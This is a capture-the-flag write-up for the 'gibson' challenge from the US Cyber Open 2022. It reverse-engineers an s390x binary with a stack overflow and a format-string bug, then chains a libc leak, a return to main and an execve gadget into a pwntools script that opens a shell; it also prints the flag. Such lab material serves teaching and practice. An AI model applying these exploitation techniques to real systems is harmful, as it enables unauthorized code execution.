# gibson - Stack overflow to RCE on s390x
> Can you really call it a "main"frame if I haven't used it before now?
> Author:  [Research Innovations, Inc. (RII)](https://www.researchinnovations.com/)
> -   [gibson_s390x.tar](https://github.com/tj-oconnor/cyber-open-2022/blob/main/pwn/gibson/files/gibson_s390x.tar)

Gibson was a binary exploitation challenge in the US Cyber Open CTF in 2022, which is the first step toward qualification for the US Cyber Team. At the end of the CTF, it was worth 1000 points and had 10 solves. I was the fourth solve on this challenge (could have been second if CTFd wasn't glitching<sup id="a1">[[1]](#f1)</sup> 😔).

Anyways, let's get to the challenge!

We are given a tarball that contains a docker setup (for both debug and testing), and the binaries for the challenge (which were a program called `mainframe` and the `libc.so.6` file that it dynamically loads).

## Initial Investigation - What even is this?

Running `file` and `checksec` on the binary, we find that it is compiled for the s390x architecture. I'd never heard of this architecture before, but looking it up, it looks like it was designed by IBM, and was discontinued in 1998. 💀

```
$ file mainframe
mainframe: ELF 64-bit MSB executable, IBM S/390, version 1 (SYSV), dynamically linked, interpreter /lib/ld64.so.1, BuildID[sha1]=5684ff421a651508bbe92190636290180d7e03c2, for GNU/Linux 3.2.0, not stripped
$ checksec mainframe
[!] Could not populate PLT: AttributeError: arch must be one of ['aarch64', 'alpha', 'amd64', 'arm', 'avr', 'cris', 'i386', 'ia64', 'm68k', 'mips', 'mips64', 'msp430', 'none', 'powerpc', 'powerpc64', 'riscv', 's390', 'sparc', 'sparc64', 'thumb', 'vax']
[*] '/home/ethan/ctf/uscyberopen/pwn/gibson/gibson_s390x/bin/mainframe'
    Arch:     em_s390-64-big
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x1000000)
```

This gives us some information about the binary. Seems that s390x is a big-endian architecture (yikes!), and that the binary is compiled with no PIE and no canary. 

## Setting up the environment - Thanks for the help!
Thankfully, the challenge author has left a `tips.md` file for us to read, to guide us in setting up a debug/test environment. Not only that, but a `docker-compose.yml` file has been left for us to do all the necessary configuration for the challenge environment. Other people did run into some problems with the debug environment not working, but this could be solved by updating to the latest version of Docker and docker-compose. 

Running `docker-compose up --build -d`, we start the containers—one for debug and one for testing. As we can see from the `tips.md` file, we can connect to `localhost:8888` to access the debug challenge, `localhost:1234` to access the qemu gdbserver, and `localhost:9999` to access a testing environment for the challenge that should be identical to the one that the organizers have.

Now that we have a debug environment, we can start with the actual challenge!

## Reverse engineering - Time to guess what opcodes do!

I looked online for any decompilers for s390x, but it seems that there was nothing. So, I installed `s390x-linux-gnu-objdump` with `apt-get install binutils-s390x-linux-gnu`, and started reading through the assembly code. The important part of the disassembly is the `main` function:

> Sidenote: Sadly, `s390x-linux-gnu-objdump` does not seem to support Intel syntax, so we'll have to bear with what we have right now.😢

```asm
0000000001000830 <main>:
 1000830:       eb bf f0 58 00 24       stmg    %r11,%r15,88(%r15)
 1000836:       e3 f0 fb 58 ff 71       lay     %r15,-1192(%r15)
 100083c:       b9 04 00 bf             lgr     %r11,%r15
 1000840:       c4 18 00 00 0b d8       lgrl    %r1,1001ff0 <stdin@GLIBC_2.2>
 1000846:       e3 10 10 00 00 04       lg      %r1,0(%r1)
 100084c:       a7 59 00 00             lghi    %r5,0
 1000850:       a7 49 00 02             lghi    %r4,2
 1000854:       a7 39 00 00             lghi    %r3,0
 1000858:       b9 04 00 21             lgr     %r2,%r1
 100085c:       c0 e5 ff ff ff 1c       brasl   %r14,1000694 <setvbuf@plt>
 1000862:       c4 18 00 00 0b cb       lgrl    %r1,1001ff8 <stdout@GLIBC_2.2>
 1000868:       e3 10 10 00 00 04       lg      %r1,0(%r1)
 100086e:       a7 59 00 00             lghi    %r5,0
 1000872:       a7 49 00 02             lghi    %r4,2
 1000876:       a7 39 00 00             lghi    %r3,0
 100087a:       b9 04 00 21             lgr     %r2,%r1
 100087e:       c0 e5 ff ff ff 0b       brasl   %r14,1000694 <setvbuf@plt>
 1000884:       ec 1b 00 a0 00 d9       aghik   %r1,%r11,160
 100088a:       a7 49 04 00             lghi    %r4,1024
 100088e:       a7 39 00 00             lghi    %r3,0
 1000892:       b9 04 00 21             lgr     %r2,%r1
 1000896:       c0 e5 ff ff ff 0f       brasl   %r14,10006b4 <memset@plt>
 100089c:       c0 20 00 00 00 d6       larl    %r2,1000a48 <_IO_stdin_used+0x4>
 10008a2:       c0 e5 ff ff fe d9       brasl   %r14,1000654 <puts@plt>
 10008a8:       c0 20 00 00 00 d7       larl    %r2,1000a56 <_IO_stdin_used+0x12>
 10008ae:       c0 e5 ff ff fe d3       brasl   %r14,1000654 <puts@plt>
 10008b4:       ec 1b 00 a0 00 d9       aghik   %r1,%r11,160
 10008ba:       a7 49 07 d0             lghi    %r4,2000
 10008be:       b9 04 00 31             lgr     %r3,%r1
 10008c2:       a7 29 00 00             lghi    %r2,0
 10008c6:       c0 e5 ff ff fe 97       brasl   %r14,10005f4 <read@plt>
 10008cc:       c0 20 00 00 00 cf       larl    %r2,1000a6a <_IO_stdin_used+0x26>
 10008d2:       c0 e5 ff ff fe c1       brasl   %r14,1000654 <puts@plt>
 10008d8:       e5 48 b4 a0 00 00       mvghi   1184(%r11),0
 10008de:       a7 f4 00 13             j       1000904 <main+0xd4>
 10008e2:       e3 10 b4 a0 00 04       lg      %r1,1184(%r11)
 10008e8:       43 11 b0 a0             ic      %r1,160(%r1,%r11)
 10008ec:       c0 17 00 00 00 52       xilf    %r1,82
 10008f2:       18 21                   lr      %r2,%r1
 10008f4:       e3 10 b4 a0 00 04       lg      %r1,1184(%r11)
 10008fa:       42 21 b0 a0             stc     %r2,160(%r1,%r11)
 10008fe:       eb 01 b4 a0 00 7a       agsi    1184(%r11),1
 1000904:       e3 10 b4 a0 00 04       lg      %r1,1184(%r11)
 100090a:       c2 1e 00 00 03 ff       clgfi   %r1,1023
 1000910:       a7 c4 ff e9             jle     10008e2 <main+0xb2>
 1000914:       a7 29 00 00             lghi    %r2,0
 1000918:       c0 e5 ff ff fe 8e       brasl   %r14,1000634 <sleep@plt>
 100091e:       ec 1b 00 a0 00 d9       aghik   %r1,%r11,160
 1000924:       b9 04 00 21             lgr     %r2,%r1
 1000928:       c0 e5 ff ff fe 76       brasl   %r14,1000614 <printf@plt>
 100092e:       a7 18 00 00             lhi     %r1,0
 1000932:       b9 14 00 11             lgfr    %r1,%r1
 1000936:       b9 04 00 21             lgr     %r2,%r1
 100093a:       eb bf b5 00 00 04       lmg     %r11,%r15,1280(%r11)
 1000940:       07 fe                   br      %r14
 1000942:       07 07                   nopr    %r7
 1000944:       07 07                   nopr    %r7
 1000946:       07 07                   nopr    %r7
 ```
These opcodes are different than the familiar ones, as this is not x86. I found a reference for the opcodes at https://en.wikibooks.org/wiki/360_Assembly/360_Instruction, but a lot of the opcodes do not have a wiki article added so I had to do a bit of inferring as to what each opcode did.

While investigating s390x, I also noticed that at the end of each function, we have a `br %r14` instruction. This instruction means that program execution continues at the address in `r14` after a function is called. We could say that the return address is stored in the `r14` register. I also found that `r15` is being used as the stack pointer.

After a while, I found two vulnerabilities. First of all, there's a stack buffer overflow at `0x10008c6`:

```asm
 10008b4:       ec 1b 00 a0 00 d9       aghik   %r1,%r11,160
 10008ba:       a7 49 07 d0             lghi    %r4,2000
 10008be:       b9 04 00 31             lgr     %r3,%r1
 10008c2:       a7 29 00 00             lghi    %r2,0
 10008c6:       c0 e5 ff ff fe 97       brasl   %r14,10005f4 <read@plt>
```

Here, 2000 bytes are written into a buffer that is 1024 (or something like that) bytes long. We can guess from here that the calling convention for this architecture is that arguments get passed through `r2`, `r3`, and then `r4`. This is because we see here that `read(0, <address>, 2000)` is being called.

Another vulnerability that I found was that at `0x1000928`, user input is passed through `r2`, making it the first argument to `printf`. This is a format string vulnerability.

```asm
 100091e:       ec 1b 00 a0 00 d9       aghik   %r1,%r11,160
 1000924:       b9 04 00 21             lgr     %r2,%r1
 1000928:       c0 e5 ff ff fe 76       brasl   %r14,1000614 <printf@plt>
 ```
However, after running the program (through connecting to `localhost:9999`), we can see that the lines of assembly before the call to `printf` do manipulate our input a little bit.

```
$ nc localhost 9999
GIBSON S390X
Enter payroll data:
asdfasdfasdfasdf
Processing data...
3!643!643!643!64XRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR
```

Through looking at the assembly and experimenting a bit, we can see that our input is XORed with the character `R` before being passed to `printf`. This shouldn't be a problem, because we can just XOR our input with `R` before passing it the program.

So, let's see what we know at this point:
- The program reads in too much input, leading to a stack buffer overflow
- The program also calls `printf()` on the input XORed with `R`, allowing us to leak values (or write to arbitrary addresses with the `%n` format specifier)

## Exploitation - What do we control?
We do have a stack overflow, but we do not know if the stack in s390x works the same way as in x86. So, we do some experimentation.

First, we generate a cyclic pattern with `cyclic 2000 -n 8`. Then we pass it to the program running with GDB at `localhost:8888`. This can be debugged with the gdbserver running at `localhost:1234` using gdb-multiarch:

```
gef➤  set architecture s390:64-bit
The target architecture is assumed to be s390:64-bit
gef➤  file bin/mainframe
Reading symbols from bin/mainframe...
(No debugging symbols found in bin/mainframe)
Python Exception <class 'ValueError'> 22 is not a valid Abi:
gef➤  target remote localhost:1234
```

We can then examine the registers in GDB with `info reg`. Four of the registers look like they have been affected by our input:

```
r11            0x7061616161616166  0x7061616161616166
r12            0x7161616161616166  0x7161616161616166
r13            0x7261616161616166  0x7261616161616166
r14            0x7361616161616166  0x7361616161616166
r15            0x7461616161616166  0x7461616161616166
```

Seems that we have control over `r11`, `r12`, `r13`, `r14`, and `r15`! This is more register control than we would have in x86_64, where we have control over only `rbp` and `rip`. We know that `r14` will be jumped to at the end of the function, so we do control the return address. We also know that `r15` is the stack pointer. This should not be changed by our overflow. Lastly, we control `r11` through `r13`, which could be useful later when trying to get a shell. 

We look up the offsets to our saved registers with `cyclic -l 0x6661616161616170 -n 8`. (Note how I had to convert from big endian to little endian) This gives us an offset of 1120 bytes to our saved registers!

The `mainframe` binary in of itself does not have a win function or anything that would be useful to call, so we will have to try to leak the libc base address in order to get a shell. We can do this with a format string. This format string leak can be done in the same way as we would usually do a format string leak, so I will not cover the details here. However, there are two things that we must pay attention to:
- We must make sure to XOR it with `R` when we are finished. 
- Because this is big-endian, the first two bytes are null. So, if we want to leak with `%s`, we must offset our address by 2 to get the non-null bytes.

I used this python snippet with pwntools to generate the format string payload<sup id="a2">[[2]](#f2):

```python
xor(b"%6$s\0\0\0\0" + p64(elf.got.puts+2), b"R")
```

We can parse this with u64() in pwntools, which will automatically use big endian for p64() and u64() if we set the context correctly.

Now that we have a leak, we can use our overflow to return back to the main function and do another overflow, this time with a leak!

## Finding shell gadgets - Grep for the win!
Now that we have control of the program control flow and a leak, we can jump to an address that will give us a shell! On x86_64, I would use a one_gadget to spawn a shell. However, there are no tools (that I know of) that will do this on s390x. I'm not even sure if there are any one_gadgets on this version of the s390x libc. However, remembering that we have control over `r11`, `r12`, and `r13`, we can find something that's close enough.

First of all, we need to look into syscalls in the s390x architecture. Finding a place where the `execve` syscall is being called is a good first step in finding somewhere that will spawn a shell. I found a [table](https://github.com/torvalds/linux/blob/master/arch/s390/kernel/syscalls/syscall.tbl) of syscall numbers int the kernel source code, which tells us that `execve` is syscall 11. Referring back to the table of instructions found earlier, we find that the `svc` instruction is used to call a syscall. We chain `objdump` and `grep` to find where this syscall is used:

```
$ s390x-linux-gnu-objdump -d libc.so.6  | grep -B 3 -
A 3 'svc\s*11$'
   d9bfe:       07 07                   nopr    %r7

00000000000d9c00 <execve@@GLIBC_2.2>:
   d9c00:       0a 0b                   svc     11
   d9c02:       a7 49 f0 01             lghi    %r4,-4095
   d9c06:       b9 21 00 24             clgr    %r2,%r4
   d9c0a:       c0 b4 00 00 00 04       jgnl    d9c12 <execve@@GLIBC_2.2+0x12>
```
There's only one location where `execve` is called, at the beginning of the `execve()` function. We use the same strategy to find where `execve()` is called, and we find this gadget:

```
$ s390x-linux-gnu-objdump -d libc.so.6  | grep -B 3 -A 3 'd9c00'
                                ...
   da680:       b3 cd 00 49             lgdr    %r4,%f9
   da684:       b3 cd 00 3e             lgdr    %r3,%f14
   da688:       b9 04 00 2d             lgr     %r2,%r13
   da68c:       c0 e5 ff ff fa ba       brasl   %r14,d9c00 <execve@@GLIBC_2.2>
   da692:       e3 10 b0 a0 00 04       lg      %r1,160(%r11)
   da698:       e3 60 10 00 00 04       lg      %r6,0(%r1)
   da69e:       58 16 a0 00             l       %r1,0(%r6,%r10)
                                ...
```

Jumping to `libc base + 0xda688` will load the contents of `r13` into `r2` (where the first argument of the syscall is called), then call `execve()`, which will call the `execve` syscall!

Because we control `r13`, we can put the address of `/bin/sh` (which is present in libc because of the `system` function) into the first argument passed to `excecve`, hope that `r3` and `r4` are 0, and spawn a shell!<sup id="a3">[[3]](#f3)

That gives us our final exploit path:
- Leak libc address by using the format string to read from the GOT
- Return to main because we control `r14`
- Return to the shell gadget while setting `r13` to a pointer to `/bin/sh`

## Putting it all together

Here's my solve script:

```python
from pwn import *

elf = ELF("./mainframe")
libc = ELF("./libc.so.6")
context.arch = "s390"
context.bits = 64
conn = remote("localhost", 9999)

payload = xor(b"%6$s\0\0\0\0" + p64(elf.got.puts+2), b"R")
payload = payload.ljust(1120, b"a")
payload += p64(0)  # r11
payload += p64(0)  # r12
payload += p64(0)  # r13
payload += p64(elf.sym.main) # r14
conn.send(payload) # ret2main

conn.recvuntil(b"...\n")
libc.address = u64(b"\0\0" + conn.recv(6)) - libc.sym.puts # leak libc
info("libc @ " + hex(libc.address))

payload = b""
payload = payload.ljust(1120, b"a")
payload += p64(0)  # r11
payload += p64(0)  # r12
payload += p64(next(libc.search(b'/bin/sh'))) # r13, gets popped into r2
payload += p64(libc.address + 0xda680) # r14, our shell gadget
conn.send(payload)

conn.interactive()
```

This gets us a shell, and we can run `cat flag` to get the flag<sup id="a4">[[4]](#f4): `USCG{RIIdiculouslyAwesome_5d4b48559f6ee937b9cbfc809bafad62}`


<b id="f1">[[1]]</b> The organizers were not able to host the challenge as something that players could connect to, so instead we had to submit solve scripts through a (glitchy) submission box on CTFd. I believe that my submission didn't go through the first time I solved it.😭[↩](#a1)

<b id="f2">[[2]]</b> Originally, I used `%p` to leak the libc address, but this was different on the debug and testing environments, probably because the stack was shifted around as a result of the different environments. A more reliable way was to use the GOT to leak, which is what I did in this writeup. [↩](#a2)

<b id="f3">[[3]]</b> After some discussion with others, it seems that some people were able to utilize the `system` function, or find a gadget to arbitrarily set `r2`. But I like this method because it's the first thing that I found in libc. 🙂[↩](#a3)

<b id="f4">[[4]]</b> This was actually DMed to us afterwards, as the organizers ran the solve scripts against their own infrastructure rather than having players to run them. [↩](#a4)
